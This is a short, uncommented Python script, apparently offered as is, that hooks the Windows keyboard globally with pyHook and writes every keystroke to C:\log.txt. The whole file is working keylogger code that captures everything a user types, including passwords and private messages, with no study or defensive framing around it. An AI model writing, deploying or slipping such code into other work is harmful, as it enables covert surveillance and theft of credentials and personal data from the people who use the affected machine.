import pyHook, pythoncom, sys, logging

key_log = 'C:\\log.txt'

def KeyEvent(event):
    logging.basicConfig(filename=key_log, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10, chr(event.Ascii))
    return True

hook = pyHook.HookManager()
hook.KeyDown = KeyEvent
hook.HookKeyboard()
pythoncom.PumpMessages()
